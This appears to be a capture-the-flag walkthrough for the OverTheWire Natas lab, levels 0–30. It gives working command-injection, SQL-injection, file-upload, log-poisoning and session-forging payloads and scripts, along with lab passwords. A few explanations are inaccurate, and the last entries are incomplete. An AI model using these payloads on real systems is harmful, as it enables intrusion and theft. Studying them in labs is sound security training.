### Natas Level 0 → Level 1
**Key Takeaways**: Checking the page source for extra information. The password is often embedded in the HTML code.

**Procedure**: Check page source using right-click or Ctrl + U for the password of the next level.

### Natas Level 1 → Level 2
**Key Takeaways**: Checking the page source for extra information. The password is often embedded in the HTML code.

**Procedure**: Check page source using Ctrl + U (since right-click is disabled) for the password of the next level.

### Natas Level 2 → Level 3  
**Key Takeaways**:  
Sometimes the password is not directly in the page source but hidden in files linked from the page, such as images or directories. It’s important to check all linked resources.

**Procedure**:  
Open the page source using right-click → *View Page Source* or press `Ctrl + U`. Look for any linked files (for example, an image file or a directory path). In this level, you’ll find a link to an image inside a `/files/` directory. Open this image’s URL directly or explore the `/files/` directory if allowed. Then, open the image in a text editor or use tools that can reveal hidden text (sometimes included in image comments or metadata). The password for the next level is hidden there.

### Natas Level 3 → Level 4  
**Key Takeaways**:  
Websites often use a `robots.txt` file to tell search engines which directories not to index. This file can accidentally reveal hidden or sensitive directories worth exploring.

**Procedure**:  
Open the page source using right-click → *View Page Source* or press `Ctrl + U`, but you may not find anything helpful there. Instead, try accessing `robots.txt` by appending `/robots.txt` to the URL. This file lists directories that the site owner wants to hide from search engines. Locate the disallowed directory path mentioned in `robots.txt` (/s3cr3t/), navigate to that directory in your browser, and look for files like `users.txt`. Open the file to find the password for the next level.

### Natas Level 4 → Level 5  
**Key Takeaways**: Websites can use the HTTP `Referer` header to check where a request originated. This level demonstrates how relying on the `Referer` for security is weak, as it can be easily manipulated.

**Procedure**:  

1. Log in using the username `natas4` and the password obtained from Level 3.

2. The page will display a message like: "You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/""

3. To bypass this check, modify the `Referer` header in your request. You can do this using tools like `curl` or Burp Suite.

4. Example with `curl`:

        curl -u natas4:<password> --referer "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/

The password will be displayed within the HTML code.

5. For Burp Suite, simply change the Referer from http://natas4.natas.labs.overthewire.org to http://natas5.natas.labs.overthewire.org/ manually, to get the password on the page.

### Natas Level 5 → Level 6  
**Key Takeaways**: This level introduces the concept of cookies for user identification. It shows how cookies can be manipulated to change user roles or bypass restrictions.

**Procedure**:  

1. Log in using the username `natas5` and the password obtained from Level 4.

2. The page will display: "Access disallowed. You are not logged in". This indicates that we need to somehow login to the website.

3. This can be done by manipulating the cookies using the browser Developer Tools.
- Open the browser's DevTools (F12 or Ctrl + Shift + I).
- Go to the *Application* (or *Storage*) tab.
- Find and edit the cookie for `loggedin` to `1`.

4. Reload the page, and the server will grant access and display the password for natas6.

### Natas Level 6 → Level 7  
**Key Takeaways**: This level demonstrates the danger of insecure file inclusion through user-controlled input. It highlights how including files based on unsanitized parameters can be exploited.

**Procedure**:  

1. Log in using the username `natas6` and the password obtained from Level 5.

2. The page will show a form asking for an input like a secret code.

3. View source code using the link provided.

4. In the source code, look for hints. You’ll find: `include("includes/secret.inc")`;
   This file likely contains the secret needed for the form.

5. Try accessing this file directly by navigating to: `http://natas6.natas.labs.overthewire.org/includes/secret.inc`. The file will display something like: `$secret = "some_secret_value";`
Copy the secret value.

6. Enter this value in the form on the main page and submit it. The page will display the password for natas7.

### Natas Level 7 → Level 8  
**Key Takeaways**: This level teaches about directory traversal (path traversal) attacks, where attackers manipulate file paths to access files outside the intended directory.

**Procedure**:  

1. Log in using the username `natas7` and the password obtained from Level 6.

2. The page will display links like: `?page=home`, `?page=about`

3. View the page source: Right-click → *View Page Source*, or Press `Ctrl + U`. A hint says that the password is in `/etc/natas_webpass/natas8`.

4. Try a directory traversal payload to access files outside the intended directory:
   "`http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`"
The password will appear on the page.

### Natas Level 8 → Level 9  
**Key Takeaways**: This level demonstrates insecure cryptographic operations — specifically weak encoding/decoding practices where an algorithm is easily reversible if you know its behavior.

**Procedure**:  

1. Log in using the username `natas8` and the password obtained from Level 7.

2. The page asks you to enter a secret.

3. View source code using the link provided.
   
4. In the PHP source, we can see the encoded secret along with the function that encodes the secret: `bin2hex(strrev(base64_encode($secret)));`

5. We simply need to reverse the encoding process to obtain the secret:

           <?php
           $encodedSecret = "someFixedString";
           print base64_decode(strrev(hex2bin($encodedSecret)));
           ?>

6. This PHP code will give the secret. The secret when entered into the field will give the password to the next level.

### Natas Level 9 → Level 10  
**Key Takeaways**: This level introduces command injection, where user input is passed directly to a system command without proper sanitization, allowing arbitrary command execution.

**Procedure**:  

1. Log in using the username `natas9` and the password obtained from Level 8.

2. The page has a form where you can enter a search term (for example, to search in a file).

3. View source code using the link provided.

4. In the PHP code, you'll see that user input is passed into a system command like: `passthru("grep -i $key dictionary.txt");`

5. Since input is not properly escaped, you can inject a command:

                a; cat /etc/natas_webpass/natas10
                           or
                grep -i; cat /etc/natas_webpass/natas10 dictionary.txt
   
Submit this payload in the search form.

6. The server will execute both the `grep` and `cat` commands, displaying the password for natas10.

### Natas Level 10 → Level 11  
**Key Takeaways**: This level builds on command injection, but the input is filtered. It demonstrates that weak input filtering can still be bypassed if not done properly.

**Procedure**:  

1. Log in using the username `natas10` and the password obtained from Level 9.

2. The page again offers a search form similar to the previous level.

3. View source code using the link provided.

4. The PHP code shows a blacklist filter:
   
        if(preg_match('/[;|&]/',$key)) {
            print "Input contains an illegal character!";
        } else {
            passthru("grep -i $key dictionary.txt");
        }

5. The filter blocks ;, &, and |, but you can use alternative ways to inject commands, such as:

        a /etc/natas_webpass/natas11

6. The server will execute both the `grep` and `cat` commands, displaying the password for natas11.   

### Natas Level 11 → Level 12  
**Key Takeaways**: This level demonstrates weak encryption with an XOR cipher applied to cookie data. If we can reverse-engineer the key, we can modify the cookie to escalate privileges.

**Procedure**:

1. Log in using the username `natas11` and the password obtained from Level 10.

2. Capture the `data` cookie value provided by the server. Example: "`HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyJvTRg%3D`".

3. Furthermore, by taking a look in the source code, an XOR-base encryption function can be found.

                function xor_encrypt($in) {
                    $key = '<censored>';
                    $text = $in;
                    $outText = '';

                    // Iterate through each character
                    for($i=0;$i<strlen($text);$i++) {
                    $outText .= $text[$i] ^ $key[$i % strlen($key)];
                    }

                    return $outText;
                }

4. To get our key the simplest way is to define a new function and use it in the local script as follows:

                <?php
                        function xor_encrypt_2($in) {
		                $key = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyJvTRg%3D");
		                $text = $in;
		                $outText = '';

		                // Iterate through each character
		                for($i=0;$i<strlen($text);$i++) {
			        $outText .= $text[$i] ^ $key[$i % strlen($key)];
		                }
		                return $outText;
	                        }

	                        $mydata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff" );
	                        $mydata_json = json_encode($mydata);
	                        $mydata_enc = xor_encrypt_2($mydata_json);
	                        echo $mydata_enc;
                ?>
   
   The result should be: "`eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeD	oe`".

5. It seems to be a repetition of the string `eDWo`, meaning it must be the key. Hence, we should replace the key in our script with it and execute it again. Note, that we must change the payload this time (Change "showpassword"=>"no" to "showpassword"=>"yes") and encode the result with base64. 

                <?php
                        function xor_encrypt_2($in) {
		                $key = "eDWo";
		                $text = $in;
		                $outText = '';

		                // Iterate through each character
		                for($i=0;$i<strlen($text);$i++) {
			        $outText .= $text[$i] ^ $key[$i % strlen($key)];
		                }
		                return $outText;
	                        }

	                        $mydata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff" );
	                        $mydata_json = json_encode($mydata);
	                        $mydata_enc = xor_encrypt_2($mydata_json);
	                        $mydata_b64 = base64_encode($mydata_enc);
	                        echo $mydata_b64;
                ?>

   This should return the new cookie data: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`.

6. Replace the old cookie with the new one and the password will be displayed.

### Natas Level 12 → Level 13  
**Key Takeaways**: This level demonstrates insecure file upload handling. The server allows users to upload files without proper validation, leading to the risk of uploading malicious code (e.g., PHP shells).

**Procedure**:

1. Log in using the username `natas12` and the password obtained from Level 11.

2. The page offers a file upload form where you can upload an image.

3. View source code using the link provided. 

4. From the source, you’ll notice that the server checks the file extension, but not the file contents
   
		if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        		echo "File is too big";
    			} else {
        			if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            				echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        			} else{
            				echo "There was an error uploading the file, please try again!";
        			}

5. Another thing to notice is that the .jpg exension is being added in the HTML form, making it editable in the DevTools.
   We can exploit this by creating a PHP script like:

		<?php
			require "/etc/natas_webpass/natas13";
		?>

6.  Open `Inspect` option with `Ctrl + Shift + C` and change the script in the HTML form element from `.jpg` to `.php` (`<a href="upload/rand_str.jpg">upload/rand_str.jpg</a>` to `<a href="upload/rand_str.jpg">upload/rand_str.php</a>`). Upload the script to the server now.

7.  The script will be uploaded and the result will be generated as a .php file in `/upload/rand_str.php`. Open the file to find the password to the next level. 

### Natas Level 13 → Level 14  
**Key Takeaways**:  
This level enhances file upload security by checking the file's actual signature using `exif_imagetype()`. This function inspects the first bytes of a file to verify it's a valid image. The challenge is to craft a file that passes this check but still contains executable PHP code.

**Procedure**:

1. Log in using the username `natas13` and the password obtained from Level 12.

2. The upload form checks the file's signature using: exif_imagetype(); function. According to the documentation, the function reads the first bytes of an image and checks its signature.

3. Forge a JPEG file by starting with a valid JPEG header (\xFF\xD8\xFF\xE0):

		echo "\xFF\xD8\xFF\xE0<?php require '/etc/natas_webpass/natas14';" > script.php


4. Confirm it identifies as a JPEG:

		file script.php

5. Upload this file using the form. Change the script in the HTML form element from `.jpg` to `.php` like the previous level. The file will pass the exif_imagetype() check due to its valid header.

6. Access the uploaded file via the provided link. The PHP code at the end will execute and reveal the password for natas14.

### Natas Level 14 → Level 15  
**Key Takeaways**: This level introduces basic SQL injection in login forms. It highlights the risk of including unsanitized user input directly in SQL queries, which can allow attackers to bypass authentication.

**Procedure**:

1. Log in using the username `natas14` and the password obtained from Level 13.

2. The page presents a login form asking for a username and password.

3. View source code using the link provided. 

4. The source reveals the server-side query structure:

		SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"

which means the query takes our input as it is and there is no input sanitization.

5. We can use SQL injection directly, by entering

		Username: "or""="
		Password: "or""="

7. This will directly give us the password to the next level.

### Natas Level 15 → Level 16  
**Key Takeaways**: This level challenges you to perform blind SQL injection. The server gives no visible output about whether a login attempt succeeded or failed — instead, you infer success based on subtle clues (e.g., different page content).

**Procedure**:

1. Log in using the username `natas15` and the password obtained from Level 14.

2. The page presents a login form with just a username field (no password).

3. View source code using the link provided. 

4. The query checks for:
   
   		SELECT * from users where username=\"".$_REQUEST["username"]."\"
   
6. The goal is to extract the password for natas16 by asking yes/no questions in SQL. Example payload:

		natas16" AND SUBSTRING(password,1,1) = "a" #

If the first character is "a", the page content will change to indicate the user exists.

7. Automate this by writing a script (Python, Bash, etc.) to loop through characters and positions:

- Try all possible characters (a-z, A-Z, 0-9).

- For each position in the password, test each character.

- When you get a hit, record the character and move to the next position.

  Sample script (Credits: John Hammond): https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas15.py

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits
print(characters)

username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
seen_password = []

while True:
    for ch in characters:
        attempt = "".join(seen_password) + ch
        print(f"Trying with password: {attempt}")
        try:
            response = session.post(
                url,
                data={"username": f'natas16" AND BINARY password LIKE "{attempt}%" #'},
                auth=(username, password),
                timeout=10
            )
            if 'user exists' in response.text:
                seen_password.append(ch)
                print(f"[+] Found so far: {''.join(seen_password)}")
                break
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            time.sleep(1)
            continue

        time.sleep(0.1)

    if len(seen_password) == 32:
        print(f"[✓] Password found: {''.join(seen_password)}")
        break
```

This will build the password one character at a time until complete.

### Natas Level 16 → Level 17  
**Key Takeaways**: This level demonstrates command injection vulnerabilities. It highlights how unsanitized user input passed into system commands can allow attackers to execute unintended commands, potentially leaking sensitive information.

**Procedure**

1. Log in using the username `natas16` and the password obtained from Level 15.

2. The page provides a search form with a `needle` parameter. This parameter is passed to a system command (e.g., `grep`) on the server.

3. Observing the source code, we can see that the `needle` is not properly sanitized, allowing for command injection.

4. Inject a payload to check if the password for Natas17 starts with a particular character. For example:
    
    		anythings$(grep ^h /etc/natas_webpass/natas17)
    
    If `grep` finds a match, the `anythings` string will not appear in the output.

5. Automate this check by writing a script that:
    - Iterates over all possible characters (`a-z`, `A-Z`, `0-9`).
    - Sends a request with the injected `grep` command checking for the current prefix.
    - Appends the character to the known password if the match is successful.
    - Repeats until all 32 characters are discovered.

6. Sample script (Credits: John Hammond): https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas16.py

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    found = False
    for character in characters:
        attempt = ''.join(seen_password) + character
        payload = f'anythings$(grep ^{attempt} /etc/natas_webpass/natas17)'
        try:
            response = session.post(
                url,
                data={'needle': payload},
                auth=(username, password),
                timeout=10
            )
            content = response.text
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            time.sleep(1)
            continue

        if 'anythings' not in content:
            # grep matched → no change → correct char
            seen_password.append(character)
            print(f"[+] Found so far: {''.join(seen_password)}")
            found = True
            break

        time.sleep(0.1)

    if not found:
        print("[-] No matching character found. This shouldn't happen!")
        break

print(f"[✓] Final password: {''.join(seen_password)}")
```

This will gradually build the password for the next level.

### Natas Level 17 → Level 18  
**Key Takeaways**  
This level demonstrates **blind command injection** via timing attacks. The server does not return command output, but the attacker can infer results based on response delays (e.g., using `sleep`). This teaches the importance of defending against time-based side channels.

**Procedure**

1. Log in using the username `natas17` and the password obtained from Level 16.

2. The page has a form that passes input to a shell command. Although output is hidden, timing can be observed.

3. The attack script sends:
    ```
    natas18" AND BINARY password LIKE "{test_password}%" AND SLEEP(1) #
    ```
    - If the password prefix is correct, the server sleeps for 1 second.
    - Otherwise, it responds immediately.

4. The script logic (Credits: John Hammond): https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas16.py

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import time
import string

# Character set: lowercase + uppercase + digits
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    for character in characters:
        test_password = ''.join(seen_password) + character
        print(f"Trying: {test_password}")

        # Start the timer
        start_time = time.time()

        payload = f'natas18" AND BINARY password LIKE "{test_password}%" AND SLEEP(1) #'
        response = session.post(
            url,
            data={"username": payload},
            auth=(username, password)
        )

        # Measure time difference
        end_time = time.time()
        difference = end_time - start_time

        if difference > 1:
            # Found correct character
            seen_password.append(character)
            break  # Move to next position

print("Recovered password:", ''.join(seen_password))
```
This will gradually build the password.

### Natas Level 18 → Level 19
**Key Takeaways**  
This level demonstrates **session enumeration** / insecure session handling. Predictable or enumerable session identifiers (here PHPSESSID) let an attacker impersonate other users (e.g., an admin).

**Procedure**

1. Log in using the username `natas18` and the password from Level 17.
   
2. Inspect the site — there is functionality that treats a `PHPSESSID` cookie as the session identifier and displays different content depending on the session (e.g., an admin message).

3. If session IDs are small integers or otherwise enumerable, iterate through plausible PHPSESSID values and request the page with each one.

4. When you find a session that shows the admin content, the page will reveal the password for natas19. Save it and move on.

5. The script logic (Credits: John Hammond): https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas18.py

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
from requests.auth import HTTPBasicAuth

username = "natas18"
password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()
auth = HTTPBasicAuth(username, password)

for session_id in range(1, 641):
    try:
        resp = session.get(url, cookies={"PHPSESSID": str(session_id)}, auth=auth, timeout=8)
    except requests.RequestException as e:
        print(f"[!] Request error for PHPSESSID={session_id}: {e}")
        continue

    content = resp.text
    if "You are an admin" in content:
        print("Got it! PHPSESSID =", session_id)
        print(content)
        break
    else:
        print("trying", session_id)
```

This will brute force all session IDs to find the one for the `admin`.

### Natas Level 19 → Level 20
**Key Takeaways**  
This level is similar to the previous one; the catch only being the PHPSESSID values are not sequential, and that's because they are hex-encoded.

**Procedure**

1. Log in using the username `natas19` and the password from Level 18.

2. The following code snippet will give the PHPSESSID for the admin on brute forcing:

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import binascii
import re
import time
from requests.auth import HTTPBasicAuth
import requests

username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()
auth = HTTPBasicAuth(username, password)

start = 1
end = 640  # adjust if you want a different range
success_marker = "You are an admin"
pw_regex = re.compile(r"([A-Za-z0-9]{32})")

for i in range(start, end + 1):
    # build the admin token like "89-admin" and hex-encode it
    token = f"{i}-admin".encode("utf-8")
    hex_token = binascii.hexlify(token).decode("ascii")
    cookies = {"PHPSESSID": hex_token}

    try:
        resp = session.get(url, cookies=cookies, auth=auth, timeout=8)
    except requests.RequestException as e:
        print(f"[!] Request error for i={i}: {e}")
        time.sleep(1)
        continue

    content = resp.text
    if success_marker in content:
        print(f"[+] Found admin session! i = {i}, PHPSESSID = {hex_token}")
```       

3. Input test credentials to enable the PHPSESSID cookie and then replace its value with the obtained `admin` cookie value and you'll get the password for the next level.

### Natas Level 20 → Level 21
**Key Takeaways**  
The PHPSESSID in this level is not predictable. If you can add a newline and a admin 1 line into the stored data, the server will treat your session as admin and reveal the natas21 password.

**Procedure**

1. Log in using the username `natas20` and the password from Level 19.

2. POST a `name` value that contains a newline followed by `admin 1` (for example: `plzsub\nadmin 1`), then request the page and read the admin-only content.

3. Sample script:

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

username = "natas20"
password = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"

url = f"http://{username}.natas.labs.overthewire.org/?debug=true"

session = requests.Session()

# initial GET
resp = session.get(url, auth=(username, password), timeout=10)
print(resp.text)
print("=" * 80)

# POST payload (subscribe + admin toggle)
resp = session.post(url, data={"name": "plzsub\nadmin 1"}, auth=(username, password), timeout=10)
print(resp.text)
print("=" * 80)

# final GET to observe changes
resp = session.get(url, auth=(username, password), timeout=10)
print(resp.text)
print("=" * 80)
```
The password for the next level will be found in the content of the page.

### Natas Level 21 → Level 22
**Key Takeaways**  
This level is quite similar to the previous one. Just change the URL just a bit.

**Procedure**

1. Log in using the username `natas21` and the password from Level 20.

2. Sample script (Credits: Dr4ks): https://github.com/Dr4ks/Natas_Labs_Solution

```
import requests

target = 'http://natas21.natas.labs.overthewire.org'
auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')

exp_tar='http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'


#First POST request to get session of admin from exp_tar
session=requests.Session()
response = session.post(exp_tar, auth=auth)
admin_session = session.cookies['PHPSESSID']
print(response.text)


#Second request to be admin
response = requests.get(target, auth=auth,cookies={"PHPSESSID":admin_session})
print(response.text)
```
The password for the next level will be found in the content of the page.

### Natas Level 22 → Level 23
**Key Takeaways**  
The source shows the revelio parameter triggers a redirect. For this, we need to disable automatic redirects for that GET request by using allow_redirects=False.

**Procedure**

1. Log in using the username `natas22` and the password from Level 21.

2. Sample script (Credit: Dr4ks): https://github.com/Dr4ks/Natas_Labs_Solution

```
import requests

target = 'http://natas22.natas.labs.overthewire.org/?revelio=1'
auth = ('natas22', 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz')

session=requests.Session()
response = session.get(target, auth=auth,allow_redirects=False)
print(response.text)
```
The password for the next level will be found in the content of the page.

### Natas Level 23 → Level 24
**Key Takeaways**  
The source shows that PHP will coerce the string to a number for the `> 10` test. If the string starts with digits, the numeric value is those leading digits. So you can make both conditions true by prefixing digits > 10 before the substring `iloveyou`.

**Procedure**

1. Log in using the username `natas23` and the password from Level 22.

2. Simply enter any string beginning with a number and having the substring 'iloveyou', say `123iloveyou` in the password field.

3. You'll get the password for the next level.

### Natas Level 24 → Level 25
**Key Takeaways**  
The source shows that PHP will compare the entered password string with the actual password using the `strcmp` (string compare) function. This can be exploited by 

**Procedure**

1. Log in using the username `natas24` and the password from Level 23.

2. Approach: `passwd[]=abc`

	* passwd[]=abc sends `passwd` as an array (with one element `abc`) instead of a string.
	* If the '$_REQUEST["passwd"]' is equal to an empty array, 'strcmp' returns a NULL. Due to some inherent weakneses in PHP comparisons, `NULL == 0 always returns a true`.

3. Pass the 'passwd' parameter in the URL as an array (passwd[]) and equate it to any string.

4. PHP will give a warning but the password for the next level will be revealed.

### Natas Level 25 → Level 26
**Key Takeaways**  
The source shows that the 'lang' parameter is vulnerable here, since it generates the content. It can be seen that we need to inject PHP into the User-Agent header so it is written to the site’s log files, then use the app’s file-include/LFI behavior to include the log file from `/var/www/natas/natas25/logs/` and execute that PHP to read `/etc/natas_webpass/natas26`.

**Procedure**

1. Log in using the username `natas25` and the password from Level 24.

2. Sample script (Credit: Dr4ks): https://github.com/Dr4ks/Natas_Labs_Solution

```
import requests

target = 'http://natas25.natas.labs.overthewire.org/?revelio=1'
auth = ('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')

session=requests.Session()
malhead={"User-Agent":'<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'}

response = session.get(target, auth=auth)
response=session.post(url=target,headers=malhead,auth=auth,data={"lang" : "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" +  session.cookies['PHPSESSID'] + ".log"})
print(response.text)
```
The password for the next level will be revealed in the content.

### Natas Level 26 → Level 27
**Key Takeaways**  
This level provides a drawing board feature where user inputs (x1,y1,x2,y2) are serialized into a PHP object and stored inside a cookie named drawing. The server later unserializes this cookie → classic PHP object injection vulnerability. By controlling what gets unserialized, you can trigger arbitrary code execution.

**Procedure**

1. Log in using the username `natas26` and the password from Level 25.

2. Sample script (Credits: John Hammond): https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas26.py

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
import urllib
import base64

username = 'natas26'
password = 'cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

response = session.get(url, auth = (username, password))
# print response.text
# print session.cookies

session.cookies['drawing'] = 'YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjE1IjtzOjI6InkyIjtzOjI6IjE1Ijt9fQ%3D%3D'
response = session.get(url+ '?x1=0&y1=0&x2=500&y2=500', auth = (username, password))
# print response.text


response = session.get(url + 'img/winner.php', auth = (username, password))
print (response.text)
```
The password for the next level will be revealed.

### Natas Level 27 → Level 28
**Key Takeaways**  
In this level, the code will check if the user exists in the database and if you have the right password, it will display the password. If the user does not exists, it will be created in the database. If you try to login with the user `natas28` you’ll see the following error: `Wrong password for user: natas28`. It means that the user exists. So, we need to find a way to obtains the password. 

If you create a user like user and a random password and create another user named user with enough space after the username to exceed the size of the SQL field and a random trailing characters and an empty password it will still get created. That due to the fact that MySQL will truncate the input to match the maximum field size. Then if you try to login with the user username and an empty password you’ll get the password!

**Procedure**

1. Log in using the username `natas27` and the password from Level 26.

2. Create a user named `natas28                                                                                      x` ("natas28" with multiple whitespaces and a marker at the end) with any password.

3. Login with the username `natas28` and pasword that was set for `natas28                                                                                                   x`.

4. This will be accepted and the password for the next level will be revealed.

### Natas Level 28 → Level 29
**Key Takeaways**  

* Observe the query= value is `base64 of AES-encrypted blocks (ECB)` — find the block size = 16 by sending increasing-length inputs.
* Identify the known-good header (blocks 1–2), known-good trailer (last blocks), a dummy block (from a 10-space query), and the known-bad block produced when ' is sent (it contains the escape /).
* Build a malicious plaintext like `AAAAAAAAA' OR 1=1 --` so the server inserts a / before the ', pushing the ' into the next block (making that the “bad” block).
* Replace that bad block in the base64 ciphertext with the dummy block (so the escaped / is removed) while keeping the header, your encrypted SQL-injection payload, and the trailer intact.
* URL-encode the concatenated base64 string, submit it to `search.php?query=…`, and the DB will execute the injected query — revealing the natas29 password.

**Procedure**

1. Log in using the username `natas28` and the password from Level 27.

2. Sample script:

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import base64
import math
from urllib.parse import urlparse, parse_qs, quote

username = 'natas28'
password = '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj'
base_url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
session.auth = (username, password)

block_size = 16

# payload that pushes the escaped quote into the next block on the server
injection = 'a' * 9 + "' UNION SELECT password FROM users; #"

print("=== Step 1: Parameters ===")
print("Username:", username)
print("Target URL:", base_url)
print("Block size (assumed):", block_size)
print("Injection (plaintext):", injection)
print()

# how many blocks the injected payload occupies (server prepends 10 chars)
payload_len = max(0, len(injection) - 10)
blocks = math.ceil(payload_len / block_size)
print("=== Step 2: Payload length & blocks ===")
print("Payload length (len(injection) - 10):", payload_len)
print("Blocks needed for payload:", blocks)
print()

# send the injection to get its ciphertext as returned in the redirect URL
print("=== Step 3: POST injection to obtain ciphertext for injection ===")
r = session.post(base_url, data={"query": injection})
qs = parse_qs(urlparse(r.url).query)
raw_inject_b64 = qs.get('query', [None])[0]
print("Returned redirect URL:", r.url)
print("Returned query param (base64 of ciphertext):", raw_inject_b64)
raw_inject = base64.b64decode(raw_inject_b64)
print("Decoded injection ciphertext length (bytes):", len(raw_inject))
print("Decoded injection ciphertext (hex, first 64 bytes):", raw_inject.hex()[:256])
print()

# send a "good" query (10 a's) to obtain a dummy/good base we can reuse
print("=== Step 4: POST 'a'*10 to obtain good ciphertext blocks ===")
r2 = session.post(base_url, data={"query": 'a' * 10})
qs2 = parse_qs(urlparse(r2.url).query)
good_b64 = qs2.get('query', [None])[0]
print("Returned redirect URL:", r2.url)
print("Returned good query param (base64):", good_b64)
good_base = base64.b64decode(good_b64)
print("Decoded good_base length (bytes):", len(good_base))
print("Decoded good_base (hex, first 64 bytes):", good_base.hex()[:256])
print()

# header = first 3 blocks (keeps server's header/escaping), trailer = rest after block 3
header = good_base[:block_size * 3]
trailer = good_base[block_size * 3:]

# take the middle ciphertext from the injection (the blocks we want to insert)
middle = raw_inject[block_size * 3:block_size * 3 + (blocks * block_size)]

print("=== Step 5: Constructing crafted ciphertext ===")
print("Header (3 blocks) length:", len(header))
print("Middle (injected) length (blocks * block_size):", len(middle))
print("Trailer length:", len(trailer))
print("Header (base64):", base64.b64encode(header).decode())
print("Middle (base64):", base64.b64encode(middle).decode())
print("Trailer (base64):", base64.b64encode(trailer).decode())
print()

crafted = header + middle + trailer
crafted_b64 = base64.b64encode(crafted).decode()
crafted_quoted = quote(crafted_b64, safe='').replace('/', '%2F')

print("Crafted final ciphertext (base64):", crafted_b64)
print("Crafted final ciphertext (URL-encoded):", crafted_quoted)
print()

# submit the crafted query and show server output
print("=== Step 6: Submitting crafted query and reading response ===")
resp = session.get(base_url + 'search.php/?query=' + crafted_quoted)
# print whole response length and first 400 chars to avoid huge dumps
print("Response HTTP status:", resp.status_code)
print("Response length (chars):", len(resp.text))
print("Response (first 400 chars):\n", resp.text[:400])
print()

m = re.findall(r'<li>(.*)</li>', resp.text)
if m:
    print("=== Extracted <li> content ===")
    for i, item in enumerate(m, start=1):
        print(f"{i}. {item}")
else:
    print("No <li> entries found in response. Full response saved to 'natas28_response.html'")
    with open('natas28_response.html', 'w', encoding='utf-8') as f:
        f.write(resp.text)
    print("Saved response to natas28_response.html for inspection.")
```   
This will get you the password for the next level.

### Natas Level 29 → Level 30
**Key Takeaways**  
* `index.pl?file=` forwards your file string into a Perl context that accepts pipes — you can inject shell commands by prefixing `|`.
* The application filters the token `natas`, so `cat /etc/natas_webpass/natas30` is blocked.
* Bypass the filter by breaking the literal natas string with inserted URL-encoded quotes (e.g. `na"t"as` → `na%22t%22as`), or try URL-encoded terminators (`%0a` or `%00`) to terminate the filename input.
* Send the crafted `GET` to `index.pl?file=…` (HTTP Basic auth for natas29) and the server will execute your command and include its output.
* Extract the password from the response body (it typically appears plainly).
  
**Procedure**

1. Log in using the username `natas29` and the password from Level 28.

2. Payload that works: `|cat /etc/na%22t%22as_webpass/na%22ta%22s30%0A`

3. URL becomes:

   		http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/na%22t%22as_webpass/na%22ta%22s30%0a

This will get you the password for the next level.

### Natas Level 30 → Level 31
**Key Takeaways**  

  
**Procedure**








